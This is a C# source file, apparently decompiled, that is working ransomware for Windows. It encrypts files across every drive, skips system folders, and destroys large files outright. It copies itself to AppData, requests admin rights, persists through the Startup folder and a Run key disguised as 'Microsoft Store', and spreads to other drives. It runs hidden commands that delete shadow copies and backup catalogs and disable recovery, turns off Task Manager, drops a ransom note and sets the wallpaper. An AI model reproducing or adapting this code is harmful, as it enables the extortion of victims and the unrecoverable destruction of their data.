		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Small(string inputFile, string passwordBytes)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(passwordBytes);
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream stream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.Zeros;
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.CopyTo(cryptoStream);
			fileStream.Flush();
			cryptoStream.Flush();
			fileStream.Close();
			cryptoStream.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string text = "C:\\";
			if (driveInfo.ToString() == text)
			{
				string[] array = new string[9] { "Program Files", "Program Files (x86)", "Windows", "Intel", "PerfLogs", "Windows.old", "AMD", "NVIDIA", "ProgramData" };
				string[] directories = Directory.GetDirectories(text);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
